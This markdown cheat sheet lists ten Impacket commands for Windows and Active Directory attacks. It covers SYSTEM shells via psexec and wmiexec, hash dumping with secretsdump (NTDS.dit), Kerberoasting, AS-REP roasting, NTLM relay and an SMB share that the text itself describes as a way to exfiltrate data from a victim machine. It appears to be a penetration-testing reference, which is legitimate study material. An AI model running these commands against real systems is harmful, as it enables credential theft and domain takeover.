---
title: Impacket Command List
date: 2026-01-05
category: commands
enrich: false
tags: impacket, cybersecurity, command reference
description: Top 10 essential commands for impacket.
---

# Impacket Command Guide

**Impacket** is a collection of Python classes for working with network protocols. It includes legendary scripts like `psexec.py` and `secretsdump.py`.

## Top 10 Useful Commands

### 1. PsExec (Interactive Shell)
```bash
impacket-psexec domain/user:pass@10.10.10.10
```
**Explanation:** Get a `SYSTEM` shell using SMB. Uploads a service binary.

### 2. SecretsDump (Dump Everything)
```bash
impacket-secretsdump domain/user:pass@10.10.10.10
```
**Explanation:** Dumps SAM, LSA, and DCC2 hashes. If ran against DC, dumps NTDS.dit (all domain users).

### 3. SMBClient
```bash
impacket-smbclient domain/user:pass@10.10.10.10
```
**Explanation:** Interactive SMB file transfer client (like FTP).

### 4. WMI Exec (Stealthier Shell)
```bash
impacket-wmiexec domain/user:pass@10.10.10.10
```
**Explanation:** functionality like psexec but uses WMI. Doesn't drop a binary, so often cleaner/stealthier.

### 5. SMB Server (File Hosting)
```bash
impacket-smbserver shareName /path/to/files -smb2support
```
**Explanation:** Host a local SMB share instantly. Good for exfiltrating data TO your machine from a victim windows box.

### 6. GetNPUsers (AS-REP Roasting)
```bash
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile hashes
```
**Explanation:** Attack users with "Do Not Require Kerberos Pre-Auth". No password needed to ask.

### 7. GetUserSPNs (Kerberoasting)
```bash
impacket-GetUserSPNs domain.local/user:pass -request
```
**Explanation:** Request TGS tickets for service accounts. The results can be cracked off-line.

### 8. MSSQL Client
```bash
impacket-mssqlclient domain/user:pass@10.10.10.10
```
**Explanation:** Connect to SQL Server. Supports capabilities like `xp_cmdshell` execution.

### 9. Lookupsid
```bash
impacket-lookupsid domain/user:pass@10.10.10.10
```
**Explanation:** Brute force SIDs to enumerate local and domain users/groups.

### 10. NTLM Relay
```bash
impacket-ntlmrelayx -t smb://10.10.10.20 -smb2support
```
**Explanation:** Listen for incoming NTLM connection attempts and relay them to another target.

## The Most Powerful Command
```bash
impacket-secretsdump domain/admin:pass@10.10.10.10
```
**Explanation:** The "Game Over" command. If you have admin creds on the Domain Controller, this extracts the NTLM hash of every user in the entire domain (History, krbtgt, etc).

